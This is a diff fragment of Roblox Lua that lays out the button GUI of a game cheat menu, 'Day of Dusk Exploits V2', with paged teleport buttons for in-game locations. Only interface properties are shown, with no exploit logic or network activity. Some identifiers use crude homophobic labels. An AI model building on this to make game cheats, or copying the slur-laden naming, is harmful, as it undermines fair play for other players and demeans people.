+DayOfDuskExploitsV2.TeleportFrame.Parent = DayOfDuskExploitsV2.DayOfDuskExploitsV2
+DayOfDuskExploitsV2.TeleportFrame.Active = true
+DayOfDuskExploitsV2.TeleportFrame.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+DayOfDuskExploitsV2.TeleportFrame.Position = UDim2.new(-0.5, 0, 0.209999993, 0)
+DayOfDuskExploitsV2.TeleportFrame.Size = UDim2.new(0, 301, 0, 339)
+
+DayOfDuskExploitsV2.UICorner_40.Parent = DayOfDuskExploitsV2.TeleportFrame
+
+DayOfDuskExploitsV2.TopBar_2.Name = "TopBar"
+DayOfDuskExploitsV2.TopBar_2.Parent = DayOfDuskExploitsV2.TeleportFrame
+DayOfDuskExploitsV2.TopBar_2.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
+DayOfDuskExploitsV2.TopBar_2.Size = UDim2.new(0, 301, 0, 58)
+
+DayOfDuskExploitsV2.UICorner_41.Parent = DayOfDuskExploitsV2.TopBar_2
+
+DayOfDuskExploitsV2.Frame_2.Parent = DayOfDuskExploitsV2.TopBar_2
+DayOfDuskExploitsV2.Frame_2.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+DayOfDuskExploitsV2.Frame_2.BorderSizePixel = 0
+DayOfDuskExploitsV2.Frame_2.Position = UDim2.new(0, 0, 0.741379321, 0)
+DayOfDuskExploitsV2.Frame_2.Size = UDim2.new(0, 301, 0, 15)
+
+DayOfDuskExploitsV2.TextLabel_2.Parent = DayOfDuskExploitsV2.TopBar_2
+DayOfDuskExploitsV2.TextLabel_2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.TextLabel_2.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.TextLabel_2.Position = UDim2.new(0.0505211912, 0, 0.137931034, 0)
+DayOfDuskExploitsV2.TextLabel_2.Size = UDim2.new(0, 270, 0, 29)
+DayOfDuskExploitsV2.TextLabel_2.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.TextLabel_2.Text = "Day of Dusk Exploits V2"
+DayOfDuskExploitsV2.TextLabel_2.TextColor3 = Color3.fromRGB(170, 0, 127)
+DayOfDuskExploitsV2.TextLabel_2.TextScaled = true
+DayOfDuskExploitsV2.TextLabel_2.TextSize = 14.000
+DayOfDuskExploitsV2.TextLabel_2.TextWrapped = true
+
+DayOfDuskExploitsV2.Transition_2.Name = "Transition"
+DayOfDuskExploitsV2.Transition_2.Parent = DayOfDuskExploitsV2.TeleportFrame
+DayOfDuskExploitsV2.Transition_2.BackgroundColor3 = Color3.fromRGB(59, 59, 59)
+DayOfDuskExploitsV2.Transition_2.BorderSizePixel = 0
+DayOfDuskExploitsV2.Transition_2.Position = UDim2.new(-0.00332225906, 0, 0.126370594, 0)
+DayOfDuskExploitsV2.Transition_2.Size = UDim2.new(0, 301, 0, 296)
+DayOfDuskExploitsV2.Transition_2.ZIndex = 10
+
+DayOfDuskExploitsV2.UICorner_42.Parent = DayOfDuskExploitsV2.Transition_2
+
+DayOfDuskExploitsV2.Page1.Name = "Page1"
+DayOfDuskExploitsV2.Page1.Parent = DayOfDuskExploitsV2.TeleportFrame
+DayOfDuskExploitsV2.Page1.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.Page1.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.Page1.Size = UDim2.new(1, 0, 1, 0)
+
+DayOfDuskExploitsV2.TeleportLabel1.Name = "TeleportLabel1"
+DayOfDuskExploitsV2.TeleportLabel1.Parent = DayOfDuskExploitsV2.Page1
+DayOfDuskExploitsV2.TeleportLabel1.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.TeleportLabel1.Position = UDim2.new(0.0505211912, 0, 0.171091452, 0)
+DayOfDuskExploitsV2.TeleportLabel1.Size = UDim2.new(0, 269, 0, 19)
+DayOfDuskExploitsV2.TeleportLabel1.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.TeleportLabel1.Text = "Teleports"
+DayOfDuskExploitsV2.TeleportLabel1.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.TeleportLabel1.TextSize = 14.000
+DayOfDuskExploitsV2.TeleportLabel1.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_43.Parent = DayOfDuskExploitsV2.TeleportLabel1
+
+DayOfDuskExploitsV2.BackToMenu5.Name = "BackToMenu5"
+DayOfDuskExploitsV2.BackToMenu5.Parent = DayOfDuskExploitsV2.Page1
+DayOfDuskExploitsV2.BackToMenu5.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+DayOfDuskExploitsV2.BackToMenu5.Position = UDim2.new(0.0498338863, 0, 0.837758124, 0)
+DayOfDuskExploitsV2.BackToMenu5.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.BackToMenu5.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.BackToMenu5.Text = "Back"
+DayOfDuskExploitsV2.BackToMenu5.TextColor3 = Color3.fromRGB(0, 0, 0)
+DayOfDuskExploitsV2.BackToMenu5.TextScaled = true
+DayOfDuskExploitsV2.BackToMenu5.TextSize = 14.000
+DayOfDuskExploitsV2.BackToMenu5.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_44.Parent = DayOfDuskExploitsV2.BackToMenu5
+
+DayOfDuskExploitsV2.NextPage1.Name = "NextPage1"
+DayOfDuskExploitsV2.NextPage1.Parent = DayOfDuskExploitsV2.Page1
+DayOfDuskExploitsV2.NextPage1.BackgroundColor3 = Color3.fromRGB(85, 0, 0)
+DayOfDuskExploitsV2.NextPage1.Position = UDim2.new(0.661129594, 0, 0.837758124, 0)
+DayOfDuskExploitsV2.NextPage1.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.NextPage1.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.NextPage1.Text = ">"
+DayOfDuskExploitsV2.NextPage1.TextColor3 = Color3.fromRGB(0, 0, 0)
+DayOfDuskExploitsV2.NextPage1.TextScaled = true
+DayOfDuskExploitsV2.NextPage1.TextSize = 14.000
+DayOfDuskExploitsV2.NextPage1.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_45.Parent = DayOfDuskExploitsV2.NextPage1
+
+DayOfDuskExploitsV2.PreviousPage1.Name = "PreviousPage1"
+DayOfDuskExploitsV2.PreviousPage1.Parent = DayOfDuskExploitsV2.Page1
+DayOfDuskExploitsV2.PreviousPage1.BackgroundColor3 = Color3.fromRGB(85, 0, 0)
+DayOfDuskExploitsV2.PreviousPage1.Position = UDim2.new(0.358803988, 0, 0.837758124, 0)
+DayOfDuskExploitsV2.PreviousPage1.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.PreviousPage1.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.PreviousPage1.Text = "<"
+DayOfDuskExploitsV2.PreviousPage1.TextColor3 = Color3.fromRGB(0, 0, 0)
+DayOfDuskExploitsV2.PreviousPage1.TextScaled = true
+DayOfDuskExploitsV2.PreviousPage1.TextSize = 14.000
+DayOfDuskExploitsV2.PreviousPage1.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_46.Parent = DayOfDuskExploitsV2.PreviousPage1
+
+DayOfDuskExploitsV2.ScrapCrate.Name = "ScrapCrate"
+DayOfDuskExploitsV2.ScrapCrate.Parent = DayOfDuskExploitsV2.Page1
+DayOfDuskExploitsV2.ScrapCrate.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.ScrapCrate.Position = UDim2.new(0.661129594, 0, 0.678466082, 0)
+DayOfDuskExploitsV2.ScrapCrate.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.ScrapCrate.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.ScrapCrate.Text = "Scrap crates"
+DayOfDuskExploitsV2.ScrapCrate.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.ScrapCrate.TextScaled = true
+DayOfDuskExploitsV2.ScrapCrate.TextSize = 14.000
+DayOfDuskExploitsV2.ScrapCrate.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_47.Parent = DayOfDuskExploitsV2.ScrapCrate
+
+DayOfDuskExploitsV2.BatteryCrate.Name = "BatteryCrate"
+DayOfDuskExploitsV2.BatteryCrate.Parent = DayOfDuskExploitsV2.Page1
+DayOfDuskExploitsV2.BatteryCrate.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.BatteryCrate.Position = UDim2.new(0.358803988, 0, 0.678466082, 0)
+DayOfDuskExploitsV2.BatteryCrate.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.BatteryCrate.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.BatteryCrate.Text = "Battery crate"
+DayOfDuskExploitsV2.BatteryCrate.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.BatteryCrate.TextScaled = true
+DayOfDuskExploitsV2.BatteryCrate.TextSize = 14.000
+DayOfDuskExploitsV2.BatteryCrate.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_48.Parent = DayOfDuskExploitsV2.BatteryCrate
+
+DayOfDuskExploitsV2.SubjectSwitch.Name = "SubjectSwitch"
+DayOfDuskExploitsV2.SubjectSwitch.Parent = DayOfDuskExploitsV2.Page1
+DayOfDuskExploitsV2.SubjectSwitch.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.SubjectSwitch.Position = UDim2.new(0.0498338863, 0, 0.678466082, 0)
+DayOfDuskExploitsV2.SubjectSwitch.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.SubjectSwitch.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.SubjectSwitch.Text = "Subject switch"
+DayOfDuskExploitsV2.SubjectSwitch.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.SubjectSwitch.TextScaled = true
+DayOfDuskExploitsV2.SubjectSwitch.TextSize = 14.000
+DayOfDuskExploitsV2.SubjectSwitch.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_49.Parent = DayOfDuskExploitsV2.SubjectSwitch
+
+DayOfDuskExploitsV2.PrisonCells.Name = "PrisonCells"
+DayOfDuskExploitsV2.PrisonCells.Parent = DayOfDuskExploitsV2.Page1
+DayOfDuskExploitsV2.PrisonCells.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.PrisonCells.Position = UDim2.new(0.664451838, 0, 0.54277283, 0)
+DayOfDuskExploitsV2.PrisonCells.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.PrisonCells.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.PrisonCells.Text = "Prison Cells"
+DayOfDuskExploitsV2.PrisonCells.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.PrisonCells.TextScaled = true
+DayOfDuskExploitsV2.PrisonCells.TextSize = 14.000
+DayOfDuskExploitsV2.PrisonCells.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_50.Parent = DayOfDuskExploitsV2.PrisonCells
+
+DayOfDuskExploitsV2.PrisonOverlook.Name = "PrisonOverlook"
+DayOfDuskExploitsV2.PrisonOverlook.Parent = DayOfDuskExploitsV2.Page1
+DayOfDuskExploitsV2.PrisonOverlook.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.PrisonOverlook.Position = UDim2.new(0.362126261, 0, 0.54277283, 0)
+DayOfDuskExploitsV2.PrisonOverlook.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.PrisonOverlook.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.PrisonOverlook.Text = "Prison Overlook"
+DayOfDuskExploitsV2.PrisonOverlook.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.PrisonOverlook.TextScaled = true
+DayOfDuskExploitsV2.PrisonOverlook.TextSize = 14.000
+DayOfDuskExploitsV2.PrisonOverlook.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_51.Parent = DayOfDuskExploitsV2.PrisonOverlook
+
+DayOfDuskExploitsV2.InterviewRoom.Name = "InterviewRoom"
+DayOfDuskExploitsV2.InterviewRoom.Parent = DayOfDuskExploitsV2.Page1
+DayOfDuskExploitsV2.InterviewRoom.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.InterviewRoom.Position = UDim2.new(0.0531561449, 0, 0.54277283, 0)
+DayOfDuskExploitsV2.InterviewRoom.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.InterviewRoom.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.InterviewRoom.Text = "Interview Room"
+DayOfDuskExploitsV2.InterviewRoom.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.InterviewRoom.TextScaled = true
+DayOfDuskExploitsV2.InterviewRoom.TextSize = 14.000
+DayOfDuskExploitsV2.InterviewRoom.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_52.Parent = DayOfDuskExploitsV2.InterviewRoom
+
+DayOfDuskExploitsV2.IntogRoom.Name = "IntogRoom"
+DayOfDuskExploitsV2.IntogRoom.Parent = DayOfDuskExploitsV2.Page1
+DayOfDuskExploitsV2.IntogRoom.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.IntogRoom.Position = UDim2.new(0.667774081, 0, 0.404129744, 0)
+DayOfDuskExploitsV2.IntogRoom.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.IntogRoom.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.IntogRoom.Text = "Interrogation Room"
+DayOfDuskExploitsV2.IntogRoom.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.IntogRoom.TextScaled = true
+DayOfDuskExploitsV2.IntogRoom.TextSize = 14.000
+DayOfDuskExploitsV2.IntogRoom.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_53.Parent = DayOfDuskExploitsV2.IntogRoom
+
+DayOfDuskExploitsV2.TortureRoom.Name = "TortureRoom"
+DayOfDuskExploitsV2.TortureRoom.Parent = DayOfDuskExploitsV2.Page1
+DayOfDuskExploitsV2.TortureRoom.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.TortureRoom.Position = UDim2.new(0.365448534, 0, 0.404129744, 0)
+DayOfDuskExploitsV2.TortureRoom.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.TortureRoom.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.TortureRoom.Text = "Torture Room"
+DayOfDuskExploitsV2.TortureRoom.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.TortureRoom.TextScaled = true
+DayOfDuskExploitsV2.TortureRoom.TextSize = 14.000
+DayOfDuskExploitsV2.TortureRoom.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_54.Parent = DayOfDuskExploitsV2.TortureRoom
+
+DayOfDuskExploitsV2.ChillZone.Name = "ChillZone"
+DayOfDuskExploitsV2.ChillZone.Parent = DayOfDuskExploitsV2.Page1
+DayOfDuskExploitsV2.ChillZone.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.ChillZone.Position = UDim2.new(0.0564784035, 0, 0.404129744, 0)
+DayOfDuskExploitsV2.ChillZone.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.ChillZone.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.ChillZone.Text = "Chill Zone"
+DayOfDuskExploitsV2.ChillZone.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.ChillZone.TextScaled = true
+DayOfDuskExploitsV2.ChillZone.TextSize = 14.000
+DayOfDuskExploitsV2.ChillZone.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_55.Parent = DayOfDuskExploitsV2.ChillZone
+
+DayOfDuskExploitsV2.GayAssSpawn.Name = "GayAssSpawn"
+DayOfDuskExploitsV2.GayAssSpawn.Parent = DayOfDuskExploitsV2.Page1
+DayOfDuskExploitsV2.GayAssSpawn.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.GayAssSpawn.Position = UDim2.new(0.671096325, 0, 0.268436491, 0)
+DayOfDuskExploitsV2.GayAssSpawn.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.GayAssSpawn.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.GayAssSpawn.Text = "✅ Gayman Spawn"
+DayOfDuskExploitsV2.GayAssSpawn.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.GayAssSpawn.TextSize = 14.000
+DayOfDuskExploitsV2.GayAssSpawn.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_56.Parent = DayOfDuskExploitsV2.GayAssSpawn
+
+DayOfDuskExploitsV2.GayAssChair.Name = "GayAssChair"
+DayOfDuskExploitsV2.GayAssChair.Parent = DayOfDuskExploitsV2.Page1
+DayOfDuskExploitsV2.GayAssChair.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.GayAssChair.Position = UDim2.new(0.368770808, 0, 0.268436491, 0)
+DayOfDuskExploitsV2.GayAssChair.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.GayAssChair.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.GayAssChair.Text = "Gayman Chair"
+DayOfDuskExploitsV2.GayAssChair.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.GayAssChair.TextSize = 14.000
+DayOfDuskExploitsV2.GayAssChair.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_57.Parent = DayOfDuskExploitsV2.GayAssChair
+
+DayOfDuskExploitsV2.SCRoom.Name = "SCRoom"
+DayOfDuskExploitsV2.SCRoom.Parent = DayOfDuskExploitsV2.Page1
+DayOfDuskExploitsV2.SCRoom.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.SCRoom.Position = UDim2.new(0.0598006621, 0, 0.268436491, 0)
+DayOfDuskExploitsV2.SCRoom.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.SCRoom.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.SCRoom.Text = "⚠️ SC ROOM"
+DayOfDuskExploitsV2.SCRoom.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.SCRoom.TextScaled = true
+DayOfDuskExploitsV2.SCRoom.TextSize = 14.000
+DayOfDuskExploitsV2.SCRoom.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_58.Parent = DayOfDuskExploitsV2.SCRoom
+
+DayOfDuskExploitsV2.Page2.Name = "Page2"
+DayOfDuskExploitsV2.Page2.Parent = DayOfDuskExploitsV2.TeleportFrame
+DayOfDuskExploitsV2.Page2.BackgroundColor3 = Color3.fromRGB(255, 255, 255)
+DayOfDuskExploitsV2.Page2.BackgroundTransparency = 1.000
+DayOfDuskExploitsV2.Page2.Size = UDim2.new(1, 0, 1, 0)
+DayOfDuskExploitsV2.Page2.Visible = false
+
+DayOfDuskExploitsV2.TeleportLabel2.Name = "TeleportLabel2"
+DayOfDuskExploitsV2.TeleportLabel2.Parent = DayOfDuskExploitsV2.Page2
+DayOfDuskExploitsV2.TeleportLabel2.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.TeleportLabel2.Position = UDim2.new(0.0505211912, 0, 0.171091452, 0)
+DayOfDuskExploitsV2.TeleportLabel2.Size = UDim2.new(0, 269, 0, 19)
+DayOfDuskExploitsV2.TeleportLabel2.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.TeleportLabel2.Text = "Teleports"
+DayOfDuskExploitsV2.TeleportLabel2.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.TeleportLabel2.TextSize = 14.000
+DayOfDuskExploitsV2.TeleportLabel2.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_59.Parent = DayOfDuskExploitsV2.TeleportLabel2
+
+DayOfDuskExploitsV2.BackToMenu6.Name = "BackToMenu6"
+DayOfDuskExploitsV2.BackToMenu6.Parent = DayOfDuskExploitsV2.Page2
+DayOfDuskExploitsV2.BackToMenu6.BackgroundColor3 = Color3.fromRGB(255, 170, 0)
+DayOfDuskExploitsV2.BackToMenu6.Position = UDim2.new(0.0498338863, 0, 0.837758124, 0)
+DayOfDuskExploitsV2.BackToMenu6.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.BackToMenu6.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.BackToMenu6.Text = "Back"
+DayOfDuskExploitsV2.BackToMenu6.TextColor3 = Color3.fromRGB(0, 0, 0)
+DayOfDuskExploitsV2.BackToMenu6.TextScaled = true
+DayOfDuskExploitsV2.BackToMenu6.TextSize = 14.000
+DayOfDuskExploitsV2.BackToMenu6.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_60.Parent = DayOfDuskExploitsV2.BackToMenu6
+
+DayOfDuskExploitsV2.NextPage2.Name = "NextPage2"
+DayOfDuskExploitsV2.NextPage2.Parent = DayOfDuskExploitsV2.Page2
+DayOfDuskExploitsV2.NextPage2.BackgroundColor3 = Color3.fromRGB(85, 0, 0)
+DayOfDuskExploitsV2.NextPage2.Position = UDim2.new(0.661129594, 0, 0.837758124, 0)
+DayOfDuskExploitsV2.NextPage2.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.NextPage2.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.NextPage2.Text = ">"
+DayOfDuskExploitsV2.NextPage2.TextColor3 = Color3.fromRGB(0, 0, 0)
+DayOfDuskExploitsV2.NextPage2.TextScaled = true
+DayOfDuskExploitsV2.NextPage2.TextSize = 14.000
+DayOfDuskExploitsV2.NextPage2.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_61.Parent = DayOfDuskExploitsV2.NextPage2
+
+DayOfDuskExploitsV2.PreviousPage2.Name = "PreviousPage2"
+DayOfDuskExploitsV2.PreviousPage2.Parent = DayOfDuskExploitsV2.Page2
+DayOfDuskExploitsV2.PreviousPage2.BackgroundColor3 = Color3.fromRGB(85, 0, 0)
+DayOfDuskExploitsV2.PreviousPage2.Position = UDim2.new(0.358803988, 0, 0.837758124, 0)
+DayOfDuskExploitsV2.PreviousPage2.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.PreviousPage2.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.PreviousPage2.Text = "<"
+DayOfDuskExploitsV2.PreviousPage2.TextColor3 = Color3.fromRGB(0, 0, 0)
+DayOfDuskExploitsV2.PreviousPage2.TextScaled = true
+DayOfDuskExploitsV2.PreviousPage2.TextSize = 14.000
+DayOfDuskExploitsV2.PreviousPage2.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_62.Parent = DayOfDuskExploitsV2.PreviousPage2
+
+DayOfDuskExploitsV2.Lab3.Name = "Lab3"
+DayOfDuskExploitsV2.Lab3.Parent = DayOfDuskExploitsV2.Page2
+DayOfDuskExploitsV2.Lab3.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Lab3.Position = UDim2.new(0.661129594, 0, 0.678466082, 0)
+DayOfDuskExploitsV2.Lab3.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Lab3.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Lab3.Text = "Lab-3"
+DayOfDuskExploitsV2.Lab3.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Lab3.TextScaled = true
+DayOfDuskExploitsV2.Lab3.TextSize = 14.000
+DayOfDuskExploitsV2.Lab3.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_63.Parent = DayOfDuskExploitsV2.Lab3
+
+DayOfDuskExploitsV2.Lab2.Name = "Lab2"
+DayOfDuskExploitsV2.Lab2.Parent = DayOfDuskExploitsV2.Page2
+DayOfDuskExploitsV2.Lab2.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Lab2.Position = UDim2.new(0.358803988, 0, 0.678466082, 0)
+DayOfDuskExploitsV2.Lab2.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Lab2.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Lab2.Text = "Lab-2"
+DayOfDuskExploitsV2.Lab2.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Lab2.TextScaled = true
+DayOfDuskExploitsV2.Lab2.TextSize = 14.000
+DayOfDuskExploitsV2.Lab2.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_64.Parent = DayOfDuskExploitsV2.Lab2
+
+DayOfDuskExploitsV2.Lab1.Name = "Lab1"
+DayOfDuskExploitsV2.Lab1.Parent = DayOfDuskExploitsV2.Page2
+DayOfDuskExploitsV2.Lab1.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Lab1.Position = UDim2.new(0.0498338863, 0, 0.678466082, 0)
+DayOfDuskExploitsV2.Lab1.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Lab1.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Lab1.Text = "Lab-1"
+DayOfDuskExploitsV2.Lab1.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Lab1.TextScaled = true
+DayOfDuskExploitsV2.Lab1.TextSize = 14.000
+DayOfDuskExploitsV2.Lab1.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_65.Parent = DayOfDuskExploitsV2.Lab1
+
+DayOfDuskExploitsV2.Hangar.Name = "Hangar"
+DayOfDuskExploitsV2.Hangar.Parent = DayOfDuskExploitsV2.Page2
+DayOfDuskExploitsV2.Hangar.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Hangar.Position = UDim2.new(0.664451838, 0, 0.54277283, 0)
+DayOfDuskExploitsV2.Hangar.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Hangar.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Hangar.Text = "Hangar"
+DayOfDuskExploitsV2.Hangar.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Hangar.TextScaled = true
+DayOfDuskExploitsV2.Hangar.TextSize = 14.000
+DayOfDuskExploitsV2.Hangar.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_66.Parent = DayOfDuskExploitsV2.Hangar
+
+DayOfDuskExploitsV2.Bunker.Name = "Bunker"
+DayOfDuskExploitsV2.Bunker.Parent = DayOfDuskExploitsV2.Page2
+DayOfDuskExploitsV2.Bunker.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Bunker.Position = UDim2.new(0.362126261, 0, 0.54277283, 0)
+DayOfDuskExploitsV2.Bunker.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Bunker.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Bunker.Text = "✅ Bunker"
+DayOfDuskExploitsV2.Bunker.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Bunker.TextScaled = true
+DayOfDuskExploitsV2.Bunker.TextSize = 14.000
+DayOfDuskExploitsV2.Bunker.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_67.Parent = DayOfDuskExploitsV2.Bunker
+
+DayOfDuskExploitsV2.BatteryParts.Name = "BatteryParts"
+DayOfDuskExploitsV2.BatteryParts.Parent = DayOfDuskExploitsV2.Page2
+DayOfDuskExploitsV2.BatteryParts.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.BatteryParts.Position = UDim2.new(0.0531561449, 0, 0.54277283, 0)
+DayOfDuskExploitsV2.BatteryParts.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.BatteryParts.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.BatteryParts.Text = "☢ Battery Parts"
+DayOfDuskExploitsV2.BatteryParts.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.BatteryParts.TextScaled = true
+DayOfDuskExploitsV2.BatteryParts.TextSize = 14.000
+DayOfDuskExploitsV2.BatteryParts.TextWrapped = true
+
+DayOfDuskExploitsV2.UICorner_68.Parent = DayOfDuskExploitsV2.BatteryParts
+
+DayOfDuskExploitsV2.Refinery.Name = "Refinery"
+DayOfDuskExploitsV2.Refinery.Parent = DayOfDuskExploitsV2.Page2
+DayOfDuskExploitsV2.Refinery.BackgroundColor3 = Color3.fromRGB(75, 75, 75)
+DayOfDuskExploitsV2.Refinery.Position = UDim2.new(0.667774081, 0, 0.404129744, 0)
+DayOfDuskExploitsV2.Refinery.Size = UDim2.new(0, 85, 0, 40)
+DayOfDuskExploitsV2.Refinery.Font = Enum.Font.SourceSans
+DayOfDuskExploitsV2.Refinery.Text = "✅ Refinery"
+DayOfDuskExploitsV2.Refinery.TextColor3 = Color3.fromRGB(255, 84, 69)
+DayOfDuskExploitsV2.Refinery.TextScaled = true
+DayOfDuskExploitsV2.Refinery.TextSize = 14.000
+DayOfDuskExploitsV2.Refinery.TextWrapped = true
+
